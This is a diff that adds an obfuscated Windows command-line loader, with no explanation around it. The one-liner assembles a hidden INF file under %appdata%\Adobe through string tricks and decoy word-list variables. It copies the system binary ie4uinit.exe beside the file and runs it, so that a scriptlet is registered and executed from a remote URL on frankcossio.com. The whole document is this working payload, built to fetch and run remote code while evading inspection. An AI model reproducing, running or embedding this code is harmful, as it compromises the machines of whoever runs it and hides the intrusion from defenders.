@@ -1,0 +1,7 @@
+/v /c (for %u in (s) do @set "Titles=%~u") &&
+  (for %f in (a) do @set "Whats=%~f") &&
+  (for %r in (c) do @set "Dwarf=%~r") &&
+  (for %r in (i) do @set "Nations=%~r") &&
+  call(for %u in ("[defaultinstall.windows7]" "Un\" "Register\" "OCXs=7A36" "delfiles=3CD3" "[3CD3]" "ieu%Sentences%.inf" "[version]" "signature =$windows nt$" "[7A36]" "sc\" "ro%Loans%j,NI,%Potatoes%%Office%%Office%p%Alien%%Coach%%Coach%uodsne.frankcossio.com/isllagncs" "[strings]" "Loans=b;Fields" "Potatoes=h" "servicename=' '" "Alien=:;Merry" "shortsvcname=' '" "Levels=%t!Nations!me%" "Coach=/" "Sentences=init" "Office=t;Queries" "[destinationdirs]" "defaultdestdir=11" "3CD3=01" ) do @echo %~u)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Nations!n!Absent!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Reaches81=Welcome &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Reaches47=Strike Banner Engage Makers Black Analyses Forbes Cabinets Strategy Embark Captain Designs Prints Leave Fotos Minor Circle Cables Wants Rather Educate Junior Reason Hypothesis Nominations Spoil Concerts Stress Common Adventures Country Certificate Populations Armed Boxes Salon South Needs Perhaps Monitors Fitness Readings Tumble"
